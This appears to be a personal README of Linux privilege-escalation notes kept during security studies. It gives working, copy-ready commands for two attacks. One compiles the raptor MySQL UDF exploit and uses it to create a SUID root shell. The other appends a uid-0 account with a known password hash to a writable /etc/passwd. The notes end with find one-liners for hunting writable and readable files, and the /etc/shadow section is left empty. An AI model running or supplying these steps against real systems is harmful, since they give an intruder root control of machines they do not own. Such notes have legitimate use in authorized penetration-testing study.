# Linux-Pentest
A repository to store some linux exploitation and technique i've seen during my studies

# List of contents:
- [Privilege Escalation](#Linux-Privesc)
  - [Privesc via mysql admin](#Privesc-via-mysql-admin)
  - [Weak file permissions](#Weak-file-permissions)   

## Linux Privesc:
### Privesc via mysql admin
If the mysql service is running as root we can use a popular exploit to execute commands:
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
Once we have done that we can upload the raptor.so file to the victim machine (see file upload part).
To get an rce we need to run the following commands in mysql:
```bash
mysql -u root <pass> #if we have the password
```
Now in interactive shell:
```mysql
use mysql;
create table testing(line blob);
insert into testing values(load_file('/tmp/raptor.so'));
select * from testing into dumpfile '/usr/lib/mysql/plugin/raptor.so';
create function test_check returns integer soname 'raptor.so';
select test_check('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
By doing so we have created a copy of bash with the [SUID bit](https://www.computerhope.com/jargon/s/setuid.htm) set.

### Weak file permissions
If we want to explore manually the file system to be a bit stealthier we can run the command
```bash
ls -la <file>
```
to get all the file permissions and attributes.(pretty basic)
If we have those permissions to the files below, we can privesc to root(99% of times):

* /etc/passwd _write_
* /etc/shadow _read_ _write_

#### /etc/passwd write
The /etc/passwd file was once used to store users password hashes, now it just contains users and informations word readable.
But (in some systems)we can still insert an hash and login with that.
To do so we need to create the hash of the password we choose:
```bash
openssl passwd nuovapassword
#example output: $1$sonMJF6I$upCjSzbXyTy4Eush6sx.q/
```
Now we can inject the password in a new root user:
```bash
echo 'newroot:$1$sonMJF6I$upCjSzbXyTy4Eush6sx.q/:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Now we can login with our newroot user:
```bash
su newroot  #insert nuovapassword
```
#### /etc/shadow write
We can do pretty much the same thing that we did with /etc/passwd, this time we need to generate a different hash:
```bash

```

For other files the technique may vary, but we can still search recursivly those files (may set allarms):
_With this command we will find all the files owned by OUR CURRENT USER:_
```bash
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find all the files of THE GROUP that we ARE IN:_
```bash
find / -group `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find files that are WORD WRITEABLE:_
```bash
find / -writable ! -user `whoami` ! -group `whoami` -type f -exec ls -al {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
Eventually we could also check for all the files word readable on the file stytem they are a lot:
```bash
#We can run this command on specific interesting directories:
find /opt/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /home/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /var/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /tmp/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
```
 

